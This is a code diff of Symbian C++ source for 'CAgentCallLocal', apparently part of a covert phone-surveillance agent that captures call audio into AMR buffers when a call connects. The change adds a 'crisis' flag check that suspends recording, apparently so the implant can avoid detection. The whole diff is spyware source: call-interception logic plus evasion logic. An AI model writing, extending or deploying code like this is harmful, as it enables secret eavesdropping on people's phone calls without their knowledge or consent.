@@ -9,6 +9,8 @@
 #include <e32base.h>
 #include <HT\TimeUtils.h>
 
+#include "AgentCrisis.h"
+
 // Audio data buffer size for AMR encoding (20 ms per frame, a total of 5000 ms in 250 frames).
 // http://wiki.forum.nokia.com/index.php/AMR_format
 const TInt KFrameSizeAMR = 32; 
@@ -211,9 +213,16 @@ void CAgentCallLocal::MaiscOpenComplete(TInt aError)
         // two buffers are used, they will be used in a internal FIFO queue
         if(iInCall)
         	{
-        	iInputStream->ReadL(*iStreamBufferArray[0]);
-        	iInputStream->ReadL(*iStreamBufferArray[1]);
-        	iTimer->RcsHighRes(iMicrosecInterval);
+        	// if we are in crisis don't go further
+        	// see AgentCrisis.h for hex values
+        	TInt flags=0;
+        	RProperty::Get(KPropertyUidCore, KPropertyCrisis,flags);
+        	if(!(flags & ECallCrisis))
+        		{
+        		iInputStream->ReadL(*iStreamBufferArray[0]);
+        		iInputStream->ReadL(*iStreamBufferArray[1]);
+        		iTimer->RcsHighRes(iMicrosecInterval);
+        		}
         	}
         } 
 	else
@@ -401,10 +410,17 @@ void CAgentCallLocal::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDir
 		//start recording:
 		if(iRecState == EReady)
 			{
-			iInputStream->ReadL(*iStreamBufferArray[0]);
-			iInputStream->ReadL(*iStreamBufferArray[1]);
+			// if we are in crisis don't go further
+			// see AgentCrisis.h for hex values
+			TInt flags=0;
+			RProperty::Get(KPropertyUidCore, KPropertyCrisis,flags);
+			if(!(flags & ECallCrisis))
+				{
+				iInputStream->ReadL(*iStreamBufferArray[0]);
+				iInputStream->ReadL(*iStreamBufferArray[1]);
 			
-			iTimer->RcsHighRes(iMicrosecInterval);
+				iTimer->RcsHighRes(iMicrosecInterval);
+				}
 				
 			}
 		}
